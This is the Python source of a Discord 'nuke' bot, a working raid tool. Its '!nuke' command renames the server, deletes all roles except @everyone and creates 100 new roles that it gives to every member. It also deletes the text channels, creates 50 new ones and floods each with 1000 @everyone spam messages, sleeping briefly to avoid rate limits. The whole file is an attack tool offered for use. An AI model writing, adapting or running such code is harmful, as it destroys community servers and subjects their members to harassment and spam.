# Made it create and delete roles and rename all members


import discord
from discord.ext import commands
import asyncio

# Replace 'your_token_here' with your bot's token 
TOKEN = 'your_token_here'
GUILD_NAME = 'Fear is everywhere'  # This is the name the server will be renamed to
CHANNEL_NAME = 'fear has hacked you'  # This is the name for the channels to create
ROLE_NAME_BASE = 'Fear owns you'  # This is the base name for the new roles to create
SPAM_MESSAGE = "@everyone **Wake up, Fear.io is here** :joy: https://tenor.com/view/sinister-nuked-nuke-discord-raid-gif-24293736"  # This is the message that will be spammed

intents = discord.Intents.default()
intents.guilds = True
intents.messages = True
intents.message_content = True  # Ensure you have this enabled in your bot
intents.members = True  # Add this line to allow modifying members

bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name}')

@bot.command()
async def nuke(ctx):
    guild = ctx.guild  # Get the guild where the command was invoked

    if guild:
        try:
            # Renaming the server to GUILD_NAME
            await guild.edit(name=GUILD_NAME)
            print(f'Server renamed to: {GUILD_NAME}')
            
            # Delete all roles
            for role in guild.roles:
                if role.name != "@everyone":  # Prevent deleting the @everyone role
                    await role.delete()
                    print(f'Deleted role: {role.name}')
            
            # Create 100 new roles with unique names
            new_roles = []
            for i in range(1, 101):
                role_name = f'{ROLE_NAME_BASE} {i}'
                new_role = await guild.create_role(name=role_name)
                new_roles.append(new_role)
                print(f'Created new role: {role_name}')
            
            # Assign all 100 new roles to every member
            for member in guild.members:
                try:
                    # Assign each of the 100 roles to the member
                    await member.add_roles(*new_roles)
                    print(f'Assigned 100 roles to {member.name}')
                except Exception as e:
                    print(f'Could not assign roles to {member.name}: {e}')

            # Delete existing channels, including channels in categories
            for channel in guild.channels:
                if isinstance(channel, discord.TextChannel):
                    await channel.delete()
                    print(f'Deleted channel: {channel.name}')

            # Create tasks for channel creation and spamming messages
            tasks = []
            for i in range(50):
                channel = await guild.create_text_channel(CHANNEL_NAME)
                print(f'Channel created: {CHANNEL_NAME}')
                
                # Start spamming messages in the newly created channel
                tasks.append(spam_messages(channel))

            # Wait for all tasks to complete
            await asyncio.gather(*tasks)

        except Exception as e:
            print(f'Error during nuke operation: {e}')
            await ctx.send("An error occurred while trying to nuke the server.")

    else:
        await ctx.send("Guild not found. Please check the guild name.")

async def spam_messages(channel):
    """Function to spam messages in a channel."""
    for _ in range(1000):  # Adjust the number of spam messages as needed
        await channel.send(SPAM_MESSAGE)
        print(f'Message sent in {channel.name}')
        await asyncio.sleep(0.01)  # Short delay to avoid rate limits

# Run the bot
bot.run(TOKEN)
